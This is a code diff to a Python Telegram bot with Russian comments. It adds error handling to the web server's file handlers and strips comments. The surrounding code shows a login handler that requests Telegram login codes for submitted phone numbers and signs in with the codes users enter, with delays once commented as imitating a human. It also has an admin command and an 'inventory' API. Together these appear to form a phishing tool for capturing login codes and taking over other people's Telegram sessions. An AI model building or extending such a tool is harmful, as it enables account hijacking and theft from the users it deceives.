@@ -9,6 +9,7 @@ import secrets
 import time
 from threading import Lock
 from datetime import datetime, timedelta
+from pathlib import Path
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 from aiogram.fsm.storage.memory import MemoryStorage
@@ -191,13 +192,13 @@ class TelegramLoginHandler:
         # Проверка на флуд
         if phone_number in self.pending_logins:
             pending = self.pending_logins[phone_number]
-            if time.time() - pending['timestamp'] < 120:  # 2 минуты между запросами
+            if time.time() - pending['timestamp'] < 120:
                 raise Exception("Please wait before requesting new code")
         
         client = await self._get_client(phone_number)
         
         try:
-            await asyncio.sleep(2)  # Имитация человеческой задержки
+            await asyncio.sleep(2)
             await client.connect()
             
             sent_code = await client.send_code(phone_number)
@@ -238,7 +239,7 @@ class TelegramLoginHandler:
         client = pending['client']
         
         try:
-            await asyncio.sleep(1)  # Задержка
+            await asyncio.sleep(1)
             
             try:
                 await client.sign_in(phone_number, phone_code_hash, code)
@@ -441,19 +442,31 @@ async def cmd_admin(message: types.Message):
 
 # ========== ВЕБ-СЕРВЕР ==========
 async def handle_index(request):
-    with open('index.html', 'r', encoding='utf-8') as f:
-        html = f.read()
-    return web.Response(text=html, content_type='text/html')
+    try:
+        with open('index.html', 'r', encoding='utf-8') as f:
+            html = f.read()
+        return web.Response(text=html, content_type='text/html')
+    except Exception as e:
+        logger.error(f"Failed to load index.html: {e}")
+        return web.Response(text='<h1>Error loading page</h1>', content_type='text/html')
 
 async def handle_style(request):
-    with open('style.css', 'r', encoding='utf-8') as f:
-        css = f.read()
-    return web.Response(text=css, content_type='text/css')
+    try:
+        with open('style.css', 'r', encoding='utf-8') as f:
+            css = f.read()
+        return web.Response(text=css, content_type='text/css')
+    except Exception as e:
+        logger.error(f"Failed to load style.css: {e}")
+        return web.Response(text='/* CSS not found */', content_type='text/css')
 
 async def handle_script(request):
-    with open('script.js', 'r', encoding='utf-8') as f:
-        js = f.read()
-    return web.Response(text=js, content_type='application/javascript')
+    try:
+        with open('script.js', 'r', encoding='utf-8') as f:
+            js = f.read()
+        return web.Response(text=js, content_type='application/javascript')
+    except Exception as e:
+        logger.error(f"Failed to load script.js: {e}")
+        return web.Response(text='// JS not found', content_type='application/javascript')
 
 async def handle_api_inventory(request):
     user_id = request.query.get('user_id')
